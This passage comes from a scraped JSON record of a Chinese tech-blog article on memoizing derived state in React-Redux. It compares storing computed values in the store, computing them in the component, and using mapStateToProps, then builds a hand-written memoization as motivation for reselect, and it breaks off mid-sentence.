href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;mid=2247487925\u0026amp;idx=3\u0026amp;sn=60d12d3f1f07c04eb6274e26a6ef38fb\u0026amp;chksm=97ebb21ea09c3b089baed7208c20ba4799d274a7fda41243e9f4b06149111fe9f2dae7203165\u0026amp;scene=21#wechat_redirect\"\u003e直播 | CDA \u0026amp; Microsoft-探秘数据可视化\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;mid=2247487925\u0026amp;idx=4\u0026amp;sn=e38f7bb9ea69c39213450c88459df970\u0026amp;chksm=97ebb21ea09c3b08b1ae43a2aa0c751bec0835b9ca233834f10e8c7665ad7c552c9011c3a5b6\u0026amp;scene=21#wechat_redirect\"\u003e直播 | 精益运维与DevOps最佳实践\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/blockquote\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/e13fa5ab36ea0b78e6362a4d600aa577\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514424726.1263","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e990"},"id":"5a04825b6fb9a0450f216459","author":{"$oid":"5a4b774a85b30d097483e986"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"为什么我们需要reselect","meta":{"likeCount":0},"tag":["React.js","Redux"],"comment":[],"shortContent":"这个UnusedComp 组件关心这样的几个props： a, b, c, f(a,b), h(b, c), g(a, c), u(a, b, c), 其中f, h, g, u分别是一个函数。 关于这几个计算的值， 我们应该怎么处理呢？ 这样我们的组件简单了， 只需要直接取值渲…","content":"\u003ch2 class=\"heading\"\u003e为什么我们需要reselect\u003c/h2\u003e\u003ch3 class=\"heading\"\u003e遇到的问题\u003c/h3\u003e\u003cp\u003e先看下下面的一个组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e React, { Component } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { connect } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-redux'\u003c/span\u003e\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eUnusedComp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n    render() {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c, fab, hbc, gac, uabc } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n            \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{a}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{b}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{c}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{fab}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{hbc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{gac}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{uabc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n        )\n    }\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ef\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eh\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e x + \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e * y\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eg\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e * x + y\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eu\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ex, y, z\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e x + y + z\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个UnusedComp 组件关心这样的几个props： a, b, c, f(a,b), h(b, c), g(a, c), u(a, b, c),  其中f, h, g, u分别是一个函数。 关于这几个计算的值， 我们应该怎么处理呢？\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e把数据直接计算在redux\u003c/h3\u003e\u003cp\u003e第一种， 我们把所有值存在redux， 所有store的结构大概是这样的： \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003estore = {\n    \u003cspan class=\"hljs-attr\"\u003ea\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eb\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ec\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003efab\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// a + b\u003c/span\u003e\n    hbc: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// b + 2c\u003c/span\u003e\n    gac: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 2a + c\u003c/span\u003e\n    uabc: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// a + b + c\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样我们的组件简单了， 只需要直接取值渲染就好 \u003ccode\u003econst { a, b, c, fab, hbc, gac, uabc } = this.props\u003c/code\u003e 。 那么问题来了， reducer的函数应该怎么处理呢？ 对应的如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e(action.type) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'changeA'\u003c/span\u003e: {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n            ...state,\n            \u003cspan class=\"hljs-attr\"\u003ea\u003c/span\u003e: action.a,\n            \u003cspan class=\"hljs-attr\"\u003efab\u003c/span\u003e: f(action.a, state.b),\n            \u003cspan class=\"hljs-attr\"\u003egac\u003c/span\u003e: g(action.a, state.c)\n            uabc: u(action.a, state.b, state.c)\n        }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'changeB'\u003c/span\u003e: {\n        ...\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'changeC'\u003c/span\u003e: {\n        ...\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们的reducer 函数非常复杂了， 我们每更新一个状态值。 都得维护与这个值相关的值， 不然就会有数据不一致。 \u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ereducer 只存最基本状态\u003c/h3\u003e\u003cp\u003e为了保证数据流的清晰， 更新的简单。 我们只把最基本的状态存储在redux。store的结构和redcuer函数如下： \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003estore = {\n    \u003cspan class=\"hljs-attr\"\u003ea\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eb\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ec\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n}\n...\nswitch(action.type) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'changeA'\u003c/span\u003e: {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n            ...state,\n            \u003cspan class=\"hljs-attr\"\u003ea\u003c/span\u003e: action.a\n        }\n    }\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此刻组件可能是这样的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eUnusedComp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n    render() {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fab = f(a, b)\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e hbc = h(b, c)\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e gac = g(a, c)\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e uabc = u(a, b, c)\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n            \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{a}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{b}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{c}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{fab}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{hbc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{gac}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{uabc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n        )\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或者这样的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eUnusedComp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n    componentWillReciveProps(nextProps) {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.fab = f(a, b)\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hbc = h(b, c)\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.gac = g(a, c)\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.uabc = u(a, b, c)\n    }\n\n\n    render() {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n            \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{a}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{b}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{c}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.fab}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.hbc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.gac}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.uabc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n        )\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于第一种情况， 当组件ownProps（组件自身属性， 非redux传递）, 或者setState 的时候 都会执行计算。\u003cbr\u003e对于第二钟情况， 当组件ownProps 变化的时候， 会执行计算。\u003cbr\u003e而且这两种都违背了 我们的基本原则： \u003cstrong\u003e保持组件逻辑简单\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e让数据逻辑离开组件！\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 可以写成函数式组件\u003c/span\u003e\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eUnusedComp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n    render() {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c, fab, hbc, gac, uabc } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n            \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{a}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{b}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{c}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{fab}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{hbc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{gac}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e{uabc}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh6\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n        )\n    }\n}\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003emapStateToProps\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e {a, b, c} = state\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        a,\n        b,\n        c,\n        \u003cspan class=\"hljs-attr\"\u003efab\u003c/span\u003e: f(a,b),\n        \u003cspan class=\"hljs-attr\"\u003ehbc\u003c/span\u003e: h(b,c),\n        \u003cspan class=\"hljs-attr\"\u003egac\u003c/span\u003e: g(a,c),\n        \u003cspan class=\"hljs-attr\"\u003euabc\u003c/span\u003e: u(a, b, c)\n    }\n}\nUnusedComp = connect(mapStateToProps)(UnusedComp)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e组件很简单， 接收数据展示就可以了。 看似很美好！ 我们知道当store数据被改变的时候， 会通知所有connect的组件（前提是没被销毁）。\u003cbr\u003e所有假设页面上还有 A， B， C三个组件， 这三个组件任意状态（存在redux的状态）的改变， 都会出发这里的 f, h, g, u的执行。。。听起来很扯！！！的确很扯！（在redner里面， willReciveProps里面计算是这里是不会引起函数执行的）。 但是这通常不是问题， 因为我们一般每个页面只有一个 容器组件 和redux交互， 其他子组件通过props的方式获取数据和action。 而且react-router在切换路由的时候， 是会销毁掉前一个路由的组件。 这样同一个时间只会有 一个 容器组件。 \u003c/p\u003e\n\u003cp\u003e在考虑一种情况， 假设UnusedComp还有 x, y, z 状态属性， 存在redux。 这3个属性就是简单的3个值， 只用来展示。 可是当x， y， z改变的时候，也会触发计算。 这里发生的计算不管是在render里面计算， 还是willReciveProps, 还是mapStateToProps里 都无法避免。 \u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e精确控制计算\u003c/h3\u003e\u003cp\u003e仿佛我们依据找到了 方法： \u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eredux只存基本状态\u003c/li\u003e\n\u003cli\u003ereact-router + 单 容器组件 组件\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e现实很残酷！ 实际上x, y, z这种属性， 一定大量存在。 光是这一点就会导致大量的无效计算。 之前讨论的3种方式 （render， willRecive，mapStateToProps）无法避免这种计算。 \u003c/p\u003e\n\u003cp\u003e另外mapStateToProps 还会被其他store的值改变影响 ，毕竟react-router + 单 容器组件 组件 这种组织方式只是最美好的情况。 我们有些业务就是处于性能的考虑，没有销毁之前路由的组件， 用我们自己的路由。有些页面也不是 单容器组件，尴尬！！\u003c/p\u003e\n\u003cp\u003e明显的， 我们是知道 x， y， z的变化是不需要计算的， 而a，b， c变化是需要计算的。 如何描述给程序呢？另外 mapStateToProps 这种方式还带来了好处， 我们在描述的时候，不会侵入组件！！。\u003c/p\u003e\n\u003cp\u003e最原始的描述：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e memoizeState = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003emapStateToProps\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e {a, b, c} = state\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!memoizeState) { \n       memoizeState =  {\n            a,\n            b,\n            c,\n            \u003cspan class=\"hljs-attr\"\u003efab\u003c/span\u003e: f(a,b),\n            \u003cspan class=\"hljs-attr\"\u003ehbc\u003c/span\u003e: h(b,c),\n            \u003cspan class=\"hljs-attr\"\u003egac\u003c/span\u003e: g(a,c),\n            \u003cspan class=\"hljs-attr\"\u003euabc\u003c/span\u003e: u(a, b, c)\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!(a === memoizeState.a \u0026amp;\u0026amp; b === memoizeState.b) ) {\n            \u003cspan class=\"hljs-comment\"\u003e// f should invoke\u003c/span\u003e\n            memoizeState.fab = f(a, b)\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!(b === memoizeState.b \u0026amp;\u0026amp; c === memoizeState.c) ) {\n            \u003cspan class=\"hljs-comment\"\u003e// h should invoke\u003c/span\u003e\n            memoizeState.hbc = h(b, c)\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!(a === memoizeState.a \u0026amp;\u0026amp; c === memoizeState.c) ) {\n            \u003cspan class=\"hljs-comment\"\u003e// g should invoke\u003c/span\u003e\n            memoizeState.gac = g(a, c)\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!(a === memoizeState.a \u0026amp;\u0026amp; b === memoizeState.b \u0026amp;\u0026amp; c === memoizeState.c) ) {\n            \u003cspan class=\"hljs-comment\"\u003e// u should invoke\u003c/span\u003e\n            memoizeState.uabc = u(a, b, c)\n        }\n        memoizeState.a = a\n        memoizeState.b = b\n        memoizeState.c = c\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e memoizeState\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e首选， 我们知道fab的值与a,b 有关， 所以当a, b 有变化的时候，f需要重新执行。 其他同理， 这样的话函数一定是只在必要的时候执行。 \u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用reselect\u003c/h3\u003e\u003cp\u003ereselect 解决了我们上面的那个问题， 我们也不必每次用这个最原始的描述了， 